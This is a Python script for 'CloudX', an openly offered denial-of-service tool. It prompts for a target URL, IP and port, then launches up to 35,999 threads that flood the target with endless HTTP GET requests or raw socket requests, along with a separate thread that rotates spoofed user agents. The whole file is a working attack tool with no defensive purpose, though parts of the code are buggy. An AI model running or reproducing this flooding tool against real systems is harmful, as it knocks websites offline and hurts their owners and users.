import threading
import socket
import urllib.request
import urllib.error
import random
import os
import time

os.system('clear')
print("POST Method is currently being fixed and it is error right now, please use GET instead.")
logo = """
< =============== >
      CloudX
^ <=============> ^
"""
print(logo)

# Variables
url = ""
ip = ""
port = ""
threads = ""
method = ""
maxThreads = 35999

url = input("[+] Enter a URL to attack: ")
ip = input("[+] Enter the target IP address: ")
port = input("[+] Enter the target port (default: 80): ")
numberOfThreads = input("[+] Enter the desired number of threads (default: 16500): ")
method = input("[+] Enter either 'GET' or 'POST' as the request method (default: GET): ")
print("[Check Traffic!]")
time.sleep(0.5)

if port == "":
    port = 80
else:
    port = int(port)

if numberOfThreads == "":
    numberOfThreads = 17500
else:
    numberOfThreads = int(numberOfThreads)

if numberOfThreads > maxThreads:
    numberOfThreads = maxThreads

if method == "":
    method = "GET"

# Construct attack parameters ( User Agen nya broo )
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'Connection': 'close'
}

USER_AGENT_PARTS = {
    'os': {
        'linux': {
            'name': ['Linux x86_64', 'Linux i386'],
            'ext': ['X11']
        },
        'windows': {
            'name': ['Windows NT 6.1', 'Windows NT 6.3', 'Windows NT 5.1', 'Windows NT.6.2'],
            'ext': ['WOW64', 'Win64; x64']
        },
        'mac': {
            'name': ['Macintosh'],
            'ext': ['Intel Mac OS X %d_%d_%d' % (random.randint(10, 11), random.randint(0, 9), random.randint(0, 5)) for i in range(1, 10)]
        },
    },
    'platform': {
        'webkit': {
            'name': ['AppleWebKit/%d.%d' % (random.randint(535, 537), random.randint(1,36)) for i in range(1, 30)],
            'details': ['KHTML, like Gecko'],
            'extensions': ['Chrome/%d.0.%d.%d Safari/%d.%d' % (random.randint(6, 32), random.randint(100, 2000), random.randint(0, 100), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 30) ] + [ 'Version/%d.%d.%d Safari/%d.%d' % (random.randint(4, 6), random.randint(0, 1), random.randint(0, 9), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 10)]
        },
        'iexplorer': {
            'browser_info': {
                'name': ['MSIE 6.0', 'MSIE 6.1', 'MSIE 7.0', 'MSIE 7.0b', 'MSIE 8.0', 'MSIE 9.0', 'MSIE 10.0'],
                'ext_pre': ['compatible', 'Windows; U'],
                'ext_post': ['Trident/%d.0' % i for i in range(4, 6) ] + [ '.NET CLR %d.%d.%d' % (random.randint(1, 3), random.randint(0, 5), random.randint(1000, 30000)) for i in range(1, 10)]
            }
        },
        'gecko': {
            'name': ['Gecko/%d%02d%02d Firefox/%d.0' % (random.randint(2001, 2010), random.randint(1,31), random.randint(1,12) , random.randint(10, 25)) for i in range(1, 30)],
            'details': [],
            'extensions': []
        }
    }
}

def attack(ip, port, threadNum):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    request = urllib.request.Request(url, None, headers)
    while True:
        try:
            if method == "GET":
                urlsocket_file = urllib.request.urlopen(request)
                print("[*] Thread (%s) | Attack Sent!" % (threadNum))
            else:
                s.connect((ip, port))
                for _ in range(6500):  # Adjusted the loop to send 6500 requests
                    s.send(("GET /%s HTTP/1.1\r\n" % (url)).encode('utf-8'))
                    s.send("Host: %s\r\n\r\n" % (url))
                s.close()
                print("[*] Thread (%s) | 6500 Requests Sent!" % (threadNum))
        except urllib.error.URLError as e:
            print("[*] Thread (%s) | URL or IP not valid!" % (threadNum))
            print("[*] Thread (%s) | Attack stopped." % (threadNum))

def flood_url():
    while True:
        user_agent = ' '.join([random.choice(USER_AGENT_PARTS['platform'][k]) for k in USER_AGENT_PARTS['platform']])
        user_agent += ' (' + random.choice(USER_AGENT_PARTS['platform']['webkit']['name']) + ')'
        headers['User-Agent'] = user_agent
        request = urllib.request.Request(url, None, headers)
        urllib.request.urlopen(request)

# Mulai ( start flooding )
for i in range(numberOfThreads):
    threading.Thread(target=attack, args=(ip, port, i)).start()
threading.Thread(target=flood_url).start()

# NOTE
"""
CloudX is under development, so don't have high expectations about this. alright?
"""
